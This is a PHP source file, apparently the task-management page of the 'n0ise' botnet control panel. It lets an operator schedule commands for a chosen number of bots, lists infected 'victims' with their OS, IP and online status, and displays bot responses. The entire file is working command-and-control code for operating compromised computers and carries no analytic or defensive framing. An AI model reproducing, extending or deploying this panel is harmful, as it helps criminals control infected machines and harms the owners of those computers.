<?php
require_once '/var/www/html/Webpanel/_bot/inc/config.inc.php';

class n0ise_func_tasks {
    var $content;

    function run() {
        global $_n0ise;

        if (isset($_GET['new'])) {
            $this->new_task();
        } elseif (isset($_GET['delete']) && isset($_GET['id'])) {
            $this->delete_task(intval($_GET['id']));
            $this->list2();
        } elseif (isset($_GET['id']) && intval($_GET['id'])) {
            $this->show_id(intval($_GET['id']));
        } else {
            $this->list2();
        }

        // Commands Section
        $this->content .= title("Commands");
        foreach ($_n0ise->commands as $command => $desc) {
            $this->content .= content('<b>' . htmlspecialchars($command) . '</b> - ' . htmlspecialchars($desc));
        }
    }

    function delete_task($id) {
        global $_n0ise;

        $stmt = $_n0ise->prepare("DELETE FROM n0ise_tasks WHERE taskID=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();

        $stmt = $_n0ise->prepare("DELETE FROM n0ise_task_done WHERE taskID=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();

        $stmt = $_n0ise->prepare("UPDATE n0ise_victims SET taskID=0 WHERE taskID=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();

        $this->content .= content("Task successfully deleted!", "success");
    }

    function new_task() {
        global $_n0ise;
        $this->content .= title("New Task");

        if (isset($_POST['submit'])) {
            $starttime = $endtime = false;

            if (!empty($_POST['start'])) {
                list($date, $time) = explode(' ', trim($_POST['start']));
                $date = explode('.', $date);
                $time = explode(':', $time);
                $starttime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
            }

            if (!empty($_POST['end'])) {
                list($date, $time) = explode(' ', trim($_POST['end']));
                $date = explode('.', $date);
                $time = explode(':', $time);
                $endtime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
            }

            // Input validation
            if (empty($_POST['command'])) {
                $this->content .= content("<b>Error:</b><br />Command is not specified!", "error");
            } elseif ($_POST['start'] && $_POST['start'] != date("d.m.Y H:i", $starttime)) {
                $this->content .= content("<b>Error:</b><br />Invalid start time!", "error");
            } elseif (!intval($_POST['bots'])) {
                $this->content .= content("<b>Error:</b><br />Invalid number of bots or not specified!", "error");
            } elseif (!in_array($_POST['type'], ['once', 'until'])) {
                $this->content .= content("<b>Error:</b><br />Task type not specified!", "error");
            } elseif ($_POST['type'] == "until" && $_POST['end'] != date("d.m.Y H:i", $endtime)) {
                $this->content .= content("<b>Error:</b><br />Invalid end time!", "error");
            } else {
                $elapsed = ($_POST['type'] == "until") ? $endtime : 0;
                $command = $_POST['command'];
                $bots = intval($_POST['bots']);

                $stmt = $_n0ise->prepare("INSERT INTO n0ise_tasks (`time`, `elapsed`, `command`, `bots`) VALUES (?, ?, ?, ?)");
                $stmt->bind_param("iisi", $starttime, $elapsed, $command, $bots);
                $stmt->execute();

                $taskId = $_n0ise->insert_id ?? $stmt->insert_id ?? false;

                if ($taskId) {
                    $this->content .= content("Task successfully created!", "success");
                    $this->show_id($taskId);
                } else {
                    $this->content .= content("<b>Error:</b><br />Task creation failed.", "error");
                }
                return;
            }
        }

        // Task creation form
        $table = '<form method="post" action="?action=tasks&new"><table>';
        $table .= '<tr><td style="text-align:right">Command:</td><td><input type="text" name="command" value="' . htmlspecialchars($_POST['command'] ?? '') . '"/></td></tr>';
        $table .= '<tr><td style="text-align:right;">Start Time:</td><td><input type="text" name="start" value="' . ($_POST['start'] ?? date("d.m.Y H:i")) . '"></td></tr>';
        $table .= '<tr><td style="text-align:right;">Number of Bots:</td><td><input type="text" name="bots" value="' . (intval($_POST['bots'] ?? 0)) . '"/></td></tr>';
        $table .= '<tr><td>&nbsp;</td><td><input type="radio" value="once" name="type" ' . (($_POST['type'] ?? '') == "once" ? 'checked' : '') . '/> Once <input type="radio" value="until" name="type" ' . (($_POST['type'] ?? '') == "until" ? 'checked' : '') . '/> Until</td></tr>';
        $table .= '<tr><td style="text-align:right;">End Time:</td><td><input type="text" name="end" value="' . ($_POST['end'] ?? date("d.m.Y H:i")) . '"></td></tr>';
        $table .= '<tr><td>&nbsp;</td><td style="text-align:right;"><input type="submit" value="Create Task" name="submit" /></td></tr>';
        $table .= '</table></form>';
        $this->content .= content($table);
    }

    function show_id($id) {
        global $_n0ise;

        $stmt = $_n0ise->prepare("SELECT t.*, 
            (SELECT count(*) FROM n0ise_victims WHERE taskID=t.taskID) AS vics,
            (SELECT count(*) FROM n0ise_task_done WHERE taskID=t.taskID) AS done 
            FROM n0ise_tasks AS t WHERE t.taskID=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $result = $stmt->get_result();
        $ds = $result->fetch_assoc();

        $this->content .= title("Details");

        $table = '<table>';
        $table .= '<tr><td style="text-align:right;">Task ID:</td><td><b>' . $ds['taskID'] . '</b></td></tr>';
        $table .= '<tr><td style="text-align:right;">Command:</td><td><b>' . htmlspecialchars($ds['command']) . '</b></td></tr>';
        $table .= '<tr><td style="text-align:right;">Start:</td><td>' . date("d.m.Y H:i", $ds['time']) . '</td></tr>';
        if ($ds['elapsed']) $table .= '<tr><td style="text-align:right;">End:</td><td>' . date("d.m.Y H:i", $ds['elapsed']) . '</td></tr>';
        $table .= '<tr><td style="text-align:right;">Bots:</td><td>' . $ds['bots'] . ' bots</td></tr>';
        if (!$ds['elapsed']) $table .= '<tr><td style="text-align:right;">Done:</td><td>' . $ds['done'] . ' bots</td></tr>';
        $table .= '</table>';
        $table .= '<div style="text-align:right;"><a href="?action=tasks&delete&id=' . $ds['taskID'] . '" onclick="return confirm(\'Delete task?\')" class="button red">Delete</a></div>';
        $this->content .= content($table);

        if ($ds['elapsed']) {
            $stmt = $_n0ise->prepare("SELECT * FROM n0ise_victims WHERE taskID=? AND ConTime > ?");
            $online_time = time() - $_n0ise->online;
            $stmt->bind_param("ii", $id, $online_time);
        } else {
            $stmt = $_n0ise->prepare("SELECT v.* FROM n0ise_task_done AS d LEFT JOIN n0ise_victims AS v ON v.ID=d.vicID WHERE d.taskID=?");
            $stmt->bind_param("i", $id);
        }

        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows == 0) return;

        $title = $ds['elapsed'] ? "Current Bots" : "Done by Bots";
        $this->content .= title("$title (" . $result->num_rows . ")");

        $table = '<table><tr class="tr_title">
            <td>&nbsp;</td><td>Status</td><td>Name</td><td>OS</td><td>Version</td><td>Installed</td><td>IP</td>
        </tr>';

        while ($row = $result->fetch_assoc()) {
            $status = ($row['ConTime'] > time() - $_n0ise->online)
                ? ($row['taskID'] ? '<a href="?action=tasks&id=' . $row['taskID'] . '" class="green">' . $row['command'] . '</a>' : '<span class="green">Online</span>')
                : '<span class="red">Offline</span>';
            $table .= "<tr>
                <td><input type='checkbox' name='victim[]' value='" . $row['ID'] . "' /></td>
                <td>$status</td>
                <td>" . htmlspecialchars($row['victim']) . "</td>
                <td>" . htmlspecialchars($row['os']) . "</td>
                <td>" . htmlspecialchars($row['version']) . "</td>
                <td>" . date("d.m.Y", $row['install_time']) . "</td>
                <td>" . htmlspecialchars($row['ip']) . "</td>
            </tr>";
        }

        $table .= '</table>';
        $this->content .= content($table);

        // --- NEW: Show recent bot responses for this task ---
        $stmt = $_n0ise->prepare("SELECT d.vicID, d.response, d.time, v.victim 
                                  FROM n0ise_task_done AS d 
                                  LEFT JOIN n0ise_victims AS v ON d.vicID = v.ID 
                                  WHERE d.taskID = ? 
                                  ORDER BY d.time DESC 
                                  LIMIT 20");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows) {
            $this->content .= title("Recent Bot Responses (" . $result->num_rows . ")");
            $table = '<table><tr><th>Bot Name</th><th>Response</th><th>Time</th></tr>';

            while ($row = $result->fetch_assoc()) {
                $timeStr = date("d.m.Y H:i:s", $row['time']);
                $responseSafe = nl2br(htmlspecialchars($row['response']));
                $botNameSafe = htmlspecialchars($row['victim']);

                $table .= "<tr>
                    <td>$botNameSafe</td>
                    <td style='max-width:600px; word-wrap:break-word;'>$responseSafe</td>
                    <td>$timeStr</td>
                </tr>";
            }
            $table .= '</table>';
            $this->content .= content($table);
        }
    }

    function list2() {
        global $_n0ise;

        $this->content .= title("Tasks");

        $res = $_n0ise->query("SELECT t.*, (SELECT count(*) FROM n0ise_victims WHERE taskID=t.taskID) AS vics,
            (SELECT count(*) FROM n0ise_task_done WHERE taskID=t.taskID) AS done 
            FROM n0ise_tasks AS t ORDER BY t.taskID DESC");
        if (!$res) {
            $this->content .= content("Failed to fetch tasks.", "error");
            return;
        }

        $table = '<table>
            <tr class="tr_title">
                <td>ID</td><td>Start Time</td><td>Command</td><td>Bots</td><td>Done</td><td>Active Bots</td><td>Delete</td>
            </tr>';

        while ($row = $res->fetch_assoc()) {
            $start = date("d.m.Y H:i", $row['time']);
            $done = $row['done'];
            $active = $row['vics'];
            $table .= "<tr>
                <td><a href='?action=tasks&id={$row['taskID']}'>{$row['taskID']}</a></td>
                <td>{$start}</td>
                <td>" . htmlspecialchars($row['command']) . "</td>
                <td>{$row['bots']}</td>
                <td>{$done}</td>
                <td>{$active}</td>
                <td><a href='?action=tasks&delete&id={$row['taskID']}' onclick='return confirm(\"Delete task?\");' class='button red'>X</a></td>
            </tr>";
        }

        $table .= '</table>';
        $this->content .= content($table);
    }
}
?>
